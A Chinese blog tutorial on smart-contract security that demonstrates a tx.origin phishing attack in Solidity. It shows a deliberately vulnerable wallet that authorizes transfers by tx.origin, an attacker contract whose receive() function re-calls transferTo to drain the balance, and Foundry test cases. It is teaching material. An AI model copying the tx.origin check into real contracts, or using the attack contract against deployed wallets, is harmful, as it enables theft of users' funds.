## 前言

昨天发了一篇，[tx.origin、msg.sender有什么不一样 | 登链社区 | 深入浅出区块链技术 (learnblockchain.cn)](https://learnblockchain.cn/article/3568)，被认为太水了，所以把tx.origin 攻击的代码实现一遍，让大家有个清晰的认识。

其实前面的**不一样**是今天可以这么干的基础。


实现的过程有参考：[Unboxing tx.origin. Rune Token case (adrianhetman.com)](https://www.adrianhetman.com/unboxing-tx-origin/)

## 原理

从被攻击的代码讲起：

```
contract TxUserWallet is DSTest {
    address owner;

    constructor() {
        owner = msg.sender;
        //emit log_named_address("owner", owner);
    }

    function transferTo(address payable dest, uint256 amount) public payable {
        emit log_named_address("tx.origin", tx.origin);
        emit log_named_address("owner", owner);
        require(tx.origin == owner); //** 重点 **
        dest.call{value: amount}("");
    }
}
```

这个合约transferTo函数，通过检查tx.origin来确定是不是合约拥有人在操作合约。
普通情况都是没问题的。tx.origin都是合约拥有人，可是就怕有精心构造的攻击者。
做到这些，还是要熟悉solidity的代码，上次我们讲重入 [重入攻击代码实现 | 登链社区 | 深入浅出区块链技术 (learnblockchain.cn)](https://learnblockchain.cn/article/3514)，讲了`fallback` 函数，这次我们用到`receive`函数，这个函数会在合约收到币的时候被调用。

所以，我们需要构造一种情况，`TxUserWallet ` 合约调用transferTo 给攻击合约转账，攻击合约在`receive`函数 再次调用transferTo，这个时候，tx.origin 就还是原来的账号操作人，代码写得好，你就可以转空`TxUserWallet ` 合约里的钱。

## 攻击代码

下面我们上攻击合约代码：

```
contract TxAttackWallet is DSTest {
    address payable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    fallback() external payable {
        emit log_named_address("fallback", msg.sender);
    }

    receive() external payable {
        TxUserWallet(msg.sender).transferTo(
            payable(this),
            msg.sender.balance - 1 ether
        );
    }
}
```

## 构造测试用例

```
function setUp() public {
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 8 ether);
        alice = new TxUserWallet();  //被攻击对象
        hoax(address(alice), 5 ether); //放5个币
        bob = new TxAttackWallet();  //攻击合约
        hoax(address(bob), 5 ether);  //放5个币
        emit log_named_uint("alice", address(alice).balance);
        emit log_named_address("alice", address(alice));
        emit log_named_address("bob", address(bob));
    }
```

```
function testExample() public payable {
        //startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58));
        alice.transferTo(payable(bob), 1 ether); //被攻击者给攻击合约转1个币
        emit log_named_uint("alice", address(alice).balance);
        emit log_named_uint("bob", address(bob).balance);
        emit log_string("testok");
    }
```

结果如下：
![16451845821.png](https://img.learnblockchain.cn/attachments/2022/02/3ix6dgTn620f865175253.png)

还有关键性一步，在foundry.toml里设置，

`tx_origin = '0x9BEF5148fD530244a14830f4984f2B76BCa0dC58'`

这是部署合约的操作人。

